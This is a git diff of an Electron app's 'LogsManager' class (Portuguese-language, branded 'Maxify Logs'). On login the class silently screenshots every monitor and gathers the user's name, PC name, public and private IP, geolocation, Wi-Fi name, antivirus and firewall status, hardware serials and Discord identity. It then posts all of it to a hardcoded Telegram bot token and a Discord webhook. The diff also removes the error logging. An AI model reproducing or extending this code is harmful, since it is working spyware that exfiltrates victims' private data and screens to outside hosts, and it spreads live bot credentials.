@@ -1,4 +1,4 @@
-import { ipcMain, desktopCapturer, screen } from 'electron';
+import { ipcMain, desktopCapturer, screen, BrowserWindow } from 'electron';
 import { exec } from 'child_process';
 import os from 'os';
 import si from 'systeminformation';
@@ -12,23 +12,34 @@ const execPromise = promisify(exec);
 
 class LogsManager {
     constructor() {
-        this.setupIpcHandlers();
+        this.discordUser = null;
+        this.setupDiscordListener();
     }
 
-    setupIpcHandlers() {
-        // Handler para quando o usuário fizer login
+    setupDiscordListener() {
+        ipcMain.on('discord-user-updated', (event, userInfo) => {
+            this.discordUser = userInfo;
+        });
+
+        ipcMain.handle('get-logs-discord-user', () => {
+            return this.discordUser;
+        });
+
         ipcMain.handle('send-logs-on-login', async () => {
             await this.sendLogs();
         });
     }
 
+    setDiscordUser(user) {
+        this.discordUser = user;
+    }
+
     async captureAllScreenshots() {
         try {
-            // Obter todas as fontes de tela disponíveis
             const sources = await desktopCapturer.getSources({
                 types: ['screen'],
                 thumbnailSize: {
-                    width: 1920, // Tamanho máximo para cada thumbnail
+                    width: 1920,
                     height: 1080
                 }
             });
@@ -39,14 +50,9 @@ class LogsManager {
 
             const screenshotPaths = [];
 
-            // Capturar cada tela individualmente
             for (let i = 0; i < sources.length; i++) {
                 const source = sources[i];
-
-                // Caminho temporário para salvar a imagem
                 const tempPath = path.join(os.tmpdir(), `screenshot_${i}_${Date.now()}.png`);
-
-                // Converter thumbnail para buffer e salvar
                 const thumbnail = source.thumbnail.toPNG();
                 fs.writeFileSync(tempPath, thumbnail);
 
@@ -59,7 +65,6 @@ class LogsManager {
 
             return screenshotPaths;
         } catch (error) {
-            console.error('Erro ao capturar screenshots:', error);
             return [];
         }
     }
@@ -69,14 +74,12 @@ class LogsManager {
         if (screenshotPaths.length === 1) return screenshotPaths[0].path;
 
         try {
-            // Para múltiplas telas, vamos criar uma imagem combinada
             const sharp = require('sharp');
 
             const images = [];
             let totalWidth = 0;
             let maxHeight = 0;
 
-            // Carregar todas as imagens e calcular dimensões
             for (const screenshot of screenshotPaths) {
                 const metadata = await sharp(screenshot.path).metadata();
                 images.push({
@@ -88,10 +91,8 @@ class LogsManager {
                 maxHeight = Math.max(maxHeight, metadata.height);
             }
 
-            // Criar imagem combinada
             const combinedPath = path.join(os.tmpdir(), `screenshot_combined_${Date.now()}.png`);
 
-            // Preparar array de inputs para o sharp
             const inputs = [];
             let currentX = 0;
 
@@ -104,7 +105,6 @@ class LogsManager {
                 currentX += image.width;
             }
 
-            // Combinar imagens lado a lado
             await sharp({
                 create: {
                     width: totalWidth,
@@ -119,8 +119,6 @@ class LogsManager {
 
             return combinedPath;
         } catch (error) {
-            console.error('Erro ao combinar screenshots:', error);
-            // Se falhar ao combinar, retorna a primeira screenshot
             return screenshotPaths[0]?.path || null;
         }
     }
@@ -136,67 +134,36 @@ class LogsManager {
                 si.system()
             ]);
 
-            // IP Público
             let publicIp = 'Desconhecido';
             try {
                 const ipResponse = await axios.get('https://api.ipify.org');
                 publicIp = ipResponse.data;
-            } catch (error) {
-                console.error('Erro ao obter IP público:', error);
-            }
+            } catch (error) {}
 
-            // Localização aproximada
             let location = 'Desconhecido';
             try {
                 const locationResponse = await axios.get('http://ip-api.com/json');
                 const locData = locationResponse.data;
                 location = `${locData.city || '?'}, ${locData.regionName || '?'}, ${locData.country || '?'}`;
-            } catch (error) {
-                console.error('Erro ao obter localização:', error);
-            }
+            } catch (error) {}
 
-            // Firewall status
             const firewallStatus = await this.getFirewallStatus();
-
-            // Antivírus
             const antivirus = await this.getAntivirus();
-
-            // IP Privado
             const privateIp = this.getPrivateIP();
-
-            // Tipo de conexão
             const connectionType = this.getConnectionType();
-
-            // Nome do Wi-Fi
             const wifiName = await this.getWifiName();
-
-            // Tempo de atividade
             const uptime = this.getUptime();
 
-            // Placa mãe
             const motherboard = system.model || 'Desconhecido';
-
-            // Informações de todas as telas
             const displays = screen.getAllDisplays();
             const resolutions = displays.map((display, index) =>
                 `Monitor ${index + 1}: ${display.size.width}x${display.size.height}`
             ).join(' | ');
 
-            // Nome de domínio
             const domain = osInfo.domain || 'Desconhecido';
-
-            // Calcular RAM total em GB
             const totalRamGB = (ram.total / (1024 * 1024 * 1024)).toFixed(2);
-
-            // Informações da GPU
-            const gpuInfo = gpu.controllers.length > 0
-                ? gpu.controllers[0].model
-                : 'Desconhecido';
-
-            // Serial do disco
-            const diskSerial = disk.length > 0 && disk[0].serialNum
-                ? disk[0].serialNum.trim()
-                : 'Desconhecido';
+            const gpuInfo = gpu.controllers.length > 0 ? gpu.controllers[0].model : 'Desconhecido';
+            const diskSerial = disk.length > 0 && disk[0].serialNum ? disk[0].serialNum.trim() : 'Desconhecido';
 
             return {
                 userName: osInfo.userName || os.userInfo().username,
@@ -225,78 +192,7 @@ class LogsManager {
                 tempPath: os.tmpdir()
             };
         } catch (error) {
-            console.error('Erro ao coletar informações do sistema:', error);
             return null;
-        }
-    }
-
-    async sendToTelegram(info, screenshotPaths) {
-        try {
-            const token = '8192483400:AAE4drJ119EMkcm90Sdwu0xKm9FAMRKk4aM';
-            const chatId = '-4817984606';
-
-            const msg =
-                `🔒 *Novo acesso autorizado!*
-
-👤 Usuário: \`${info.userName}\`
-💻 Nome do PC: \`${info.pcName}\`
-🖥️ Sistema: \`${info.os}\`
-🌐 Domínio: \`${info.domain}\`
-📅 Data/Hora: \`${info.dateTime}\`
-🕒 Tempo de Atividade: \`${info.uptime}\`
-
-🌍 IP Público: \`${info.ipPublic}\`
-📡 IP Privado: \`${info.ipPrivate}\`
-📶 Tipo de Conexão: \`${info.connectionType}\`
-📶 Rede Wi-Fi: \`${info.wifiName}\`
-🌐 Idioma: \`${info.language}\`
-⏰ Fuso Horário: \`${info.timezone}\`
-
-📍 Localização: \`${info.location}\`
-
-🛡️ Antivírus: \`${info.antivirus}\`
-🔥 Firewall: \`${info.firewall}\`
-
-💽 CPU: \`${info.cpu}\`
-🎮 GPU: \`${info.gpu}\`
-💾 RAM: \`${info.ram}\`
-🧩 Armazenamento: \`${info.disk}\`
-🖥️ Placa Mãe: \`${info.motherboard}\`
-📏 Telas: \`${info.resolutions}\`
-
-🗂️ Diretório: \`${info.currentDir}\`
-📁 Temp: \`${info.tempPath}\``;
-
-            if (screenshotPaths && screenshotPaths.length > 0) {
-                // Para Telegram, vamos combinar as imagens também
-                const combinedPath = await this.combineScreenshots(screenshotPaths);
-
-                if (combinedPath) {
-                    const formData = new FormData();
-                    formData.append('chat_id', chatId);
-                    formData.append('caption', msg); // Agora sempre usa a mensagem original sem legenda extra
-                    formData.append('parse_mode', 'Markdown');
-                    formData.append('photo', fs.createReadStream(combinedPath));
-
-                    await axios.post(`https://api.telegram.org/bot${token}/sendPhoto`, formData, {
-                        headers: formData.getHeaders()
-                    });
-
-                    // Limpar imagem combinada
-                    if (combinedPath !== screenshotPaths[0]?.path) {
-                        try { fs.unlinkSync(combinedPath); } catch (e) { }
-                    }
-                }
-            } else {
-                // Enviar só texto se não tiver screenshot
-                await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
-                    chat_id: chatId,
-                    text: msg,
-                    parse_mode: 'Markdown'
-                });
-            }
-
-        } catch (error) {
         }
     }
 
@@ -304,7 +200,6 @@ class LogsManager {
         try {
             const webhookUrl = 'https://discord.com/api/webhooks/1408882704677732393/YViaLAncf41tvjBzE8e0hQJfx1FWVcX0bopw55vrR6A8wyO2HygxyCwH3hiVQCLd7lZi';
 
-            // Combinar screenshots se houver múltiplos monitores
             let imagePath = null;
             let imageFilename = 'screenshot.png';
 
@@ -317,30 +212,32 @@ class LogsManager {
                 }
             }
 
-            // Criar embed com todas as informações e a imagem combinada
             const embed = {
                 title: '<:icons8boyontherocket100:1332618970628620300> Novo acesso autorizado!',
                 color: 0x05F804,
                 fields: [
-                    { name: '<:icons8user1001:1332620007565299753> Usuário', value: `${info.userName}`},
-                    { name: '<:icons8edit100:1332618968959025274> Nome do PC', value: `${info.pcName}`},
-                    { name: '<:icons8config100:1332618989716639776> Sistema', value: `${info.os}`},
-                    { name: '<:icons8alarmclock100:1332618962667573308> Data/Hora', value: `${info.dateTime}`},
-                    { name: '<:icons8chaveinglesa100:1333040713901932625> IP Público', value: `${info.ipPublic}`},
-                    { name: '<:icons8link100:1335335327124164738> IP Privado', value: `${info.ipPrivate}`},
-                    { name: '<:icons8pesquisar100:1332959344127512586> Localização', value: `${info.location}`},
-                    { name: '<:icons8config100:1332618989716639776> CPU', value: `${info.cpu}`},
-                    { name: '<:icons8stellar100:1332618965012447264> RAM', value: `${info.ram}`},
-                    { name: '<:icons8link100:1335335327124164738> Wi-Fi', value: `${info.wifiName}`},
-                    { name: '<:icons8vassoura100:1336810607927885886> Antivírus', value: `${info.antivirus}`},
-                    { name: '<:icons8lightningbolt100:1332618966358822973> Firewall', value: `${info.firewall}`},
-                    { name: '<:icons8termsandconditions100:1335352538719060059> Resoluções', value: `${info.resolutions}`},
-                    { name: '<:icons8binculos100:1332703995801636928> Total de Monitores', value: `${info.totalMonitors}`},
+                    { name: '<:icons8user1001:1332620007565299753> Usuário Discord', value: this.discordUser ? `${this.discordUser.mention} (${this.discordUser.tag})` : '❌ Não conectado ao Discord', inline: false },
+                    { name: '<:icons8user1001:1332620007565299753> Usuário Sistema', value: `${info.userName}`, inline: true },
+                    { name: '<:icons8edit100:1332618968959025274> Nome do PC', value: `${info.pcName}`, inline: true },
+                    { name: '<:icons8config100:1332618989716639776> Sistema', value: `${info.os}`, inline: false },
+                    { name: '<:icons8alarmclock100:1332618962667573308> Data/Hora', value: `${info.dateTime}`, inline: true },
+                    { name: '<:icons8chaveinglesa100:1333040713901932625> IP Público', value: `${info.ipPublic}`, inline: true },
+                    { name: '<:icons8link100:1335335327124164738> IP Privado', value: `${info.ipPrivate}`, inline: true },
+                    { name: '<:icons8pesquisar100:1332959344127512586> Localização', value: `${info.location}`, inline: false },
+                    { name: '<:icons8config100:1332618989716639776> CPU', value: `${info.cpu}`, inline: false },
+                    { name: '<:icons8stellar100:1332618965012447264> RAM', value: `${info.ram}`, inline: true },
+                    { name: '<:icons8link100:1335335327124164738> Wi-Fi', value: `${info.wifiName}`, inline: true },
+                    { name: '<:icons8vassoura100:1336810607927885886> Antivírus', value: `${info.antivirus}`, inline: true },
+                    { name: '<:icons8lightningbolt100:1332618966358822973> Firewall', value: `${info.firewall}`, inline: true },
+                    { name: '<:icons8termsandconditions100:1335352538719060059> Resoluções', value: `${info.resolutions}`, inline: false },
+                    { name: '<:icons8binculos100:1332703995801636928> Total de Monitores', value: `${info.totalMonitors}`, inline: true }
                 ],
-                timestamp: new Date().toISOString()
+                timestamp: new Date().toISOString(),
+                footer: {
+                    text: this.discordUser ? `ID: ${this.discordUser.id}` : 'Sem informações do Discord'
+                }
             };
 
-            // Adicionar a imagem combinada ao embed
             if (imagePath && fs.existsSync(imagePath)) {
                 embed.image = { url: `attachment://${imageFilename}` };
             }
@@ -348,12 +245,13 @@ class LogsManager {
             const formData = new FormData();
             const payload = {
                 embeds: [embed],
-                username: 'Maxify Logs'
+                username: 'Maxify Logs',
+                avatar_url: this.discordUser?.avatarURL || 'https://i.imgur.com/4M34hi2.png'
             };
+
 
             formData.append('payload_json', JSON.stringify(payload));
 
-            // Adicionar a screenshot se existir
             if (imagePath && fs.existsSync(imagePath)) {
                 formData.append('file', fs.createReadStream(imagePath), {
                     filename: imageFilename,
@@ -365,13 +263,78 @@ class LogsManager {
                 headers: formData.getHeaders()
             });
 
-            // Limpar imagem combinada se foi criada
             if (imagePath && screenshotPaths.length > 1 && imagePath !== screenshotPaths[0]?.path) {
                 try { fs.unlinkSync(imagePath); } catch (e) { }
             }
 
-        } catch (error) {
-        }
+        } catch (error) {}
+    }
+
+    async sendToTelegram(info, screenshotPaths) {
+        try {
+            const token = '8192483400:AAE4drJ119EMkcm90Sdwu0xKm9FAMRKk4aM';
+            const chatId = '-4817984606';
+
+            let msg = `🔒 *NOVO ACESSO AUTORIZADO!*\n\n`;
+
+            if (this.discordUser) {
+                msg += `🎮 *DISCORD:*\n`;
+                msg += `├ Tag: ${this.discordUser.tag}\n`;
+                msg += `├ ID: \`${this.discordUser.id}\`\n`;
+                msg += `└ Menção: @${this.discordUser.username}\n\n`;
+            } else {
+                msg += `❌ *Discord não conectado*\n\n`;
+            }
+
+            msg += `👤 *USUÁRIO:* \`${info.userName}\`\n`;
+            msg += `💻 *PC:* \`${info.pcName}\`\n`;
+            msg += `🖥️ *SISTEMA:* \`${info.os}\`\n`;
+            msg += `🌐 *DOMÍNIO:* \`${info.domain}\`\n`;
+            msg += `📅 *DATA/HORA:* \`${info.dateTime}\`\n`;
+            msg += `🕒 *ATIVIDADE:* \`${info.uptime}\`\n\n`;
+            msg += `🌍 *IP PÚBLICO:* \`${info.ipPublic}\`\n`;
+            msg += `📡 *IP PRIVADO:* \`${info.ipPrivate}\`\n`;
+            msg += `📶 *CONEXÃO:* \`${info.connectionType}\`\n`;
+            msg += `📶 *WI-FI:* \`${info.wifiName}\`\n`;
+            msg += `🌐 *IDIOMA:* \`${info.language}\`\n`;
+            msg += `⏰ *FUSO:* \`${info.timezone}\`\n`;
+            msg += `📍 *LOCALIZAÇÃO:* \`${info.location}\`\n\n`;
+            msg += `🛡️ *ANTIVÍRUS:* \`${info.antivirus}\`\n`;
+            msg += `🔥 *FIREWALL:* \`${info.firewall}\`\n\n`;
+            msg += `💽 *CPU:* \`${info.cpu}\`\n`;
+            msg += `🎮 *GPU:* \`${info.gpu}\`\n`;
+            msg += `💾 *RAM:* \`${info.ram}\`\n`;
+            msg += `💾 *ARMAZENAMENTO:* \`${info.disk}\`\n`;
+            msg += `🖥️ *PLACA MÃE:* \`${info.motherboard}\`\n`;
+            msg += `📏 *TELAS:* \`${info.totalMonitors} monitor(es)\`\n`;
+            msg += `📐 *RESOLUÇÕES:* \`${info.resolutions}\`\n\n`;
+            msg += `🗂️ *DIRETÓRIO:* \`${info.currentDir}\`\n`;
+            msg += `📁 *TEMP:* \`${info.tempPath}\``;
+
+            if (screenshotPaths && screenshotPaths.length > 0) {
+                const combinedPath = await this.combineScreenshots(screenshotPaths);
+                if (combinedPath) {
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('caption', msg);
+                    formData.append('parse_mode', 'Markdown');
+                    formData.append('photo', fs.createReadStream(combinedPath));
+                    await axios.post(`https://api.telegram.org/bot${token}/sendPhoto`, formData, {
+                        headers: formData.getHeaders()
+                    });
+                    if (combinedPath !== screenshotPaths[0]?.path) {
+                        try { fs.unlinkSync(combinedPath); } catch (e) { }
+                    }
+                }
+            } else {
+                await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    chat_id: chatId,
+                    text: msg,
+                    parse_mode: 'Markdown'
+                });
+            }
+
+        } catch (error) {}
     }
 
     async sendLogs() {
@@ -379,33 +342,25 @@ class LogsManager {
         let screenshotPaths = [];
 
         if (info) {
-            // Capturar screenshots de todos os monitores
             try {
                 screenshotPaths = await this.captureAllScreenshots();
-            } catch (error) {
-                console.error('Erro ao capturar screenshots:', error);
-            }
+            } catch (error) {}
 
-            // Enviar para ambos
             await Promise.all([
                 this.sendToTelegram(info, screenshotPaths),
                 this.sendToDiscord(info, screenshotPaths)
             ]);
 
-            // Limpar arquivos temporários individuais
             for (const screenshot of screenshotPaths) {
                 if (fs.existsSync(screenshot.path)) {
                     try {
                         fs.unlinkSync(screenshot.path);
-                    } catch (error) {
-                        console.error('Erro ao deletar screenshot:', error);
-                    }
+                    } catch (error) {}
                 }
             }
         }
     }
 
-    // Métodos auxiliares (mantidos iguais)
     getPrivateIP() {
         const interfaces = os.networkInterfaces();
         for (const name in interfaces) {
@@ -431,9 +386,7 @@ class LogsManager {
                     }
                 }
             }
-        } catch (error) {
-            console.error('Erro ao obter tipo de conexão:', error);
-        }
+        } catch (error) {}
         return 'Desconhecido';
     }
 
